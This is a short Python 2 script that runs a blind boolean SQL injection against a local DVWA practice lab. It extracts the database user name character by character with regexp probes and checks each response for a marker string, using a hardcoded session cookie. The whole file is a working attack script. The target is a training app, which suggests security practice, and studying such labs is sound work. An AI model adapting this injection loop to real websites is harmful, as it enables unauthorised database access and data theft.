import requests


def GetQ():
    pd = ''
    payload = '0123456789abcdefghijklmnopqrstuvwxyz!_@%.'
    for i in range(30):
        for p in payload:
            url = "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1%27%20and%20user()%20regexp%20%27^{}%27 and 'a'like'a&Submit=Submit#".format(pd+p)
            headers = {"Cookie":"security=low; PHPSESSID=65cba547699cda5ab206c6693735c8c6"}
            get = requests.get(url,headers=headers)
            if 'Surname' in get.content:
                # print p
                pd+=p
                print pd





GetQ()
